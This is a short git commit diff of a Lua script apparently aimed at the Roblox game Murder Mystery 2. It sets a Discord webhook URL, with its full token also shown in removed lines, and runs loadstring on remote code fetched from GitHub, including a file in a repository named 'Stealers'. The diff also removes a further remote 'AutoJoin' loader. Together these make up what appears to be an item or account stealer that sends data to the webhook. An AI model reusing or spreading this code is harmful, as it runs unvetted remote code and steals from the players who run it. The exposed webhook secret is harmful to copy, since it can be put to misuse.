1d56baac835a6c75423871668120006faa787871
MuderMystery2 <Yamatovn666@gmail.com>
2024-10-23 18:09:15 +0700

    .lua

--- .lua
+++ .lua
@@ -3,7 +3,3 @@ Webhook = "https://discord.com/api/webhooks/1261718729700409374/Pr05IfDSPvLPfkcB
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjq/Stealers/main/losg.lua"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua", false))()
-local channelId = "1261718561022541869"  -- Your actual channel ID
-local token = "https://discord.com/api/webhooks/1261718729700409374/Pr05IfDSPvLPfkcBE3OuX9Y2Xq-2B8q_ScWa_DpxLvBAjjIL9Q0CEKyzJUof7OXBa_Nv"  -- Your actual token
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Ezjq/mm2/refs/heads/main/AutoJoin.lua'))()
